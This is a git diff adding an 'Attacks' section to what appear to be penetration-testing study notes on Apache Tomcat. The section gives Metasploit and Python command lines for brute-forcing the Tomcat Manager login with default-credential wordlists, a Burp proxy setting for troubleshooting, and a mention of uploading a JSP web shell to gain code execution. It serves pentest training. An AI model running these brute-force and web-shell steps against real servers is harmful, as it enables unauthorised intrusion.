@@ -469,3 +469,34 @@ gobuster dir -u http://web01.company.local:8180/ -w /usr/share/dirbuster/wordlis
 ```
 We may be able to either log in to one of these using weak credentials such as tomcat:tomcat, admin:admin, etc. If these first few tries don't work, we can try a password brute force attack against the login page. If we are successful in logging in, we can upload a Web Application Resource or Web Application ARchive (WAR) file containing a JSP web shell and obtain remote code execution on the Tomcat server.
 
+## Attacks
+If we can access the /manager or /host-manager endpoints, we can likely achieve remote code execution on the Tomcat server.
+### Tomcat Manager - Login Brute Force
+```
+msfconsole
+```
+```
+use auxiliary/scanner/http/tomcat_mgr_login
+```
+```
+show options
+set VHOST <uri>
+set RPORT <port>
+set stop_on_success true
+set rhosts <IP>
+```
+```
+run
+```
+Let's say a particular Metasploit module (or another tool) is failing or not behaving the way we believe it should. We can always use Burp Suite or ZAP to proxy the traffic and troubleshoot. To do this, first, fire up Burp Suite and then set the PROXIES option like the following:
+```
+set PROXIES HTTP:127.0.0.1:8080
+```
+We can see in Burp exactly how the scanner is working, taking each credential pair and base64 encoding into account for basic auth that Tomcat uses.
+
+We can also use [this Python script](https://github.com/b33lz3bub-1/Tomcat-Manager-Bruteforce) to achieve the same result:
+```
+python3 mgr_brute.py -U http://web01.company.local:8180/ -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
+```
+
+
